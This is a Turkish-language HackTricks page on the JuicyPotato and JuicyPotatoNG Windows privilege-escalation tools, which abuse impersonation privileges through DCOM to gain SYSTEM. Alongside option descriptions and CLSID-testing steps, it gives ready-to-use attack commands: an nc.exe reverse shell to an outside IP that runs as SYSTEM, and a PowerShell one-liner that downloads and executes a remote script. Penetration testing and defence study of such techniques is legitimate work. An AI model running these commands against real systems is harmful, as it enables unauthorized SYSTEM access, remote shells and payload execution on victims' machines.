# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato legacy bir araçtır. Genellikle Windows 10 1803 / Windows Server 2016'ya kadar olan Windows sürümlerinde çalışır. Windows 10 1809 / Server 2019 ile başlayan Microsoft değişiklikleri orijinal tekniği bozmuştur. Bu sürümler ve daha yenileri için PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato ve diğerleri gibi modern alternatifleri değerlendirin. Güncel seçenekler ve kullanımları için aşağıdaki sayfaya bakın.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (golden privileges kötüye kullanılarak) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_[_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)'nin biraz daha geliştirilmiş bir sürümü_, yani **Windows Service Accounts'tan NT AUTHORITY\SYSTEM'e geçiş sağlayan başka bir Local Privilege Escalation aracı**_<sup>[[1]](#references)</sup>

#### juicypotato'yu [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) adresinden indirebilirsiniz

### Uyumluluk hakkında kısa notlar

- Mevcut context SeImpersonatePrivilege veya SeAssignPrimaryTokenPrivilege içerdiğinde Windows 10 1803 ve Windows Server 2016'ya kadar güvenilir şekilde çalışır.
- Windows 10 1809 / Windows Server 2019 ve sonraki sürümlerde Microsoft hardening değişiklikleri nedeniyle çalışmaz. Bu sürümler için yukarıda bağlantısı verilen alternatifleri tercih edin.

### Özet <a href="#summary" id="summary"></a>

[**juicy-potato Readme'sinden**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) ve [varyantları](https://github.com/decoder-it/lonelypotato), [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) tarafından sağlanan ve MiTM listener'ının `127.0.0.1:6666` üzerinde bulunmasına dayanan privilege escalation zincirinden yararlanır; bunun için `SeImpersonate` veya `SeAssignPrimaryToken` privileges gerekir. Bir Windows build incelemesi sırasında `BITS`'in kasıtlı olarak devre dışı bırakıldığı ve `6666` portunun kullanıldığı bir kurulum tespit ettik.

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)'yi weaponize etmeye karar verdik: **Juicy Potato'ya merhaba deyin.**

> Teori için [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) sayfasına bakın ve bağlantılar ile referanslar zincirini takip edin.<sup>[[4]](#references)</sup>

`BITS` dışında kötüye kullanabileceğimiz birkaç COM server bulunduğunu keşfettik. Bunların yalnızca şunları yapabilmesi gerekir:

1. normalde impersonation privileges'a sahip bir “service user” olan mevcut user tarafından instantiate edilebilmek
2. `IMarshal` interface'ini uygulamak
3. elevated bir user (SYSTEM, Administrator, …) olarak çalışmak

Bazı testlerden sonra, çeşitli Windows sürümlerinde kapsamlı bir [ilgi çekici CLSID listesi](http://ohpe.it/juicy-potato/CLSID/) elde edip test ettik.

### Juicy ayrıntıları <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato şunları yapmanıza olanak tanır:<sup>[[1]](#references)</sup>

- **Target CLSID** _istediğiniz herhangi bir CLSID'yi seçin._ [_Burada_](http://ohpe.it/juicy-potato/CLSID/) _OS'a göre düzenlenmiş listeyi bulabilirsiniz._
- **COM Listening port** _marshalled hardcoded 6666 yerine tercih ettiğiniz COM listening port'u tanımlayın_
- **COM Listening IP address** _server'ı herhangi bir IP'ye bind edin_
- **Process creation mode** _impersonated user'ın privileges'ına bağlı olarak şunlar arasından seçim yapabilirsiniz:_
- `CreateProcessWithToken` (`SeImpersonate` gerekir)
- `CreateProcessAsUser` (`SeAssignPrimaryToken` gerekir)
- `both`
- **Process to launch** _exploitation başarılı olursa bir executable veya script çalıştırın_
- **Process Argument** _çalıştırılan process'in argument'larını özelleştirin_
- **RPC Server address** _stealthy bir yaklaşım için harici bir RPC server'a authenticate olabilirsiniz_
- **RPC Server port** _harici bir server'a authenticate olmak istediğinizde ve firewall `135` portunu engellediğinde kullanışlıdır…_
- **TEST mode** _esas olarak test amaçlıdır; örneğin CLSID'leri test etmek için kullanılır. DCOM'u oluşturur ve token'ın user'ını yazdırır. Test için_ [_buraya bakın_](http://ohpe.it/juicy-potato/Test/)

### Kullanım <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Son düşünceler <a href="#final-thoughts" id="final-thoughts"></a>

[**juicy-potato Readme'ından**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Kullanıcıda `SeImpersonate` veya `SeAssignPrimaryToken` yetkileri varsa **SYSTEM** olursunuz.

Tüm bu COM Server'ların kötüye kullanılmasını önlemek neredeyse imkansızdır. Bu nesnelerin izinlerini `DCOMCNFG` aracılığıyla değiştirmeyi düşünebilirsiniz; ancak iyi şanslar, bu zorlu olacaktır.

Asıl çözüm, `* SERVICE` hesapları altında çalışan hassas hesapları ve uygulamaları korumaktır. `DCOM`'u durdurmak kesinlikle bu exploit'i engeller; ancak temel OS üzerinde ciddi bir etki oluşturabilir.

Kaynak: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG, aşağıdakileri birleştirerek modern Windows üzerinde JuicyPotato tarzı bir local privilege escalation yöntemini yeniden sunar:<sup>[[2]](#references)</sup>
- Eski, hardcoded 127.0.0.1:6666 listener'ından kaçınarak, seçilen bir port üzerindeki local RPC server'a DCOM OXID resolution.
- RpcImpersonateClient gerektirmeden gelen SYSTEM authentication bilgisini yakalayıp impersonate eden bir SSPI hook'u; bu ayrıca yalnızca SeAssignPrimaryTokenPrivilege mevcut olduğunda CreateProcessAsUser kullanılmasını sağlar.
- DCOM activation kısıtlamalarını karşılamak için kullanılan tricks (örneğin, PrintNotify / ActiveX Installer Service class'larını hedeflerken eski INTERACTIVE-group gereksinimi).

Önemli notlar (build'ler arasındaki davranışlar değişebilir):<sup>[[2]](#references)</sup>
- Eylül 2022: İlk technique, “INTERACTIVE trick” kullanılarak desteklenen Windows 10/11 ve Server hedeflerinde çalışıyordu.
- Ocak 2023'te authors tarafından yapılan güncelleme: Microsoft daha sonra INTERACTIVE trick'i engelledi. Farklı bir CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) exploitation'ı geri getirir; ancak kendi post'larına göre yalnızca Windows 11 / Server 2022 üzerinde.

Basic usage (help içinde daha fazla flag):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Windows 10 1809 / Server 2019 hedefliyorsanız ve classic JuicyPotato patch’lenmişse, üstte bağlantıları verilen alternatifleri (RoguePotato, PrintSpoofer, EfsPotato/GodPotato vb.) tercih edin. NG, build ve service durumuna bağlı olarak duruma özgü olabilir.

## Örnekler

Not: Deneyebileceğiniz CLSID’lerin listesi için [bu sayfayı](https://ohpe.it/juicy-potato/CLSID/) ziyaret edin.

### Bir nc.exe reverse shell alın
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Yeni bir CMD başlatma (RDP erişiminiz varsa)

![Powershell rev - Yeni bir CMD başlatma (RDP erişiminiz varsa): Yeni bir CMD başlatma (RDP erişiminiz varsa)](<../../images/image (300).png>)

## CLSID Sorunları

Çoğu zaman JuicyPotato'nun kullandığı varsayılan CLSID **çalışmaz** ve exploit başarısız olur. Genellikle **çalışan bir CLSID** bulmak için birden fazla deneme yapmak gerekir. Belirli bir işletim sistemi için denenecek CLSID listesini almak üzere şu sayfayı ziyaret etmelisiniz:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID'leri Kontrol Etme**

Öncelikle juicypotato.exe dışında bazı executable dosyalara ihtiyacınız olacak.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) dosyasını indirin ve PS session'ınıza yükleyin. Ardından [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) dosyasını indirip çalıştırın. Bu script, test edilebilecek olası CLSID'lerin bir listesini oluşturacaktır.

Ardından [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) dosyasını indirin (CLSID listesine ve juicypotato executable dosyasına giden path'i değiştirin) ve çalıştırın. Her CLSID'yi denemeye başlayacak ve **port numarası değiştiğinde CLSID'nin çalıştığı anlamına gelecektir**.

Çalışan CLSID'leri **-c parametresini** kullanarak **kontrol edin**.

## Referanslar

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [JuicyPotato'ya ikinci bir şans vermek: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Juicy Potato proje sayfası (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Service Account'lardan SYSTEM'a Privilege Escalation](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

{{#include ../../banners/hacktricks-training.md}}
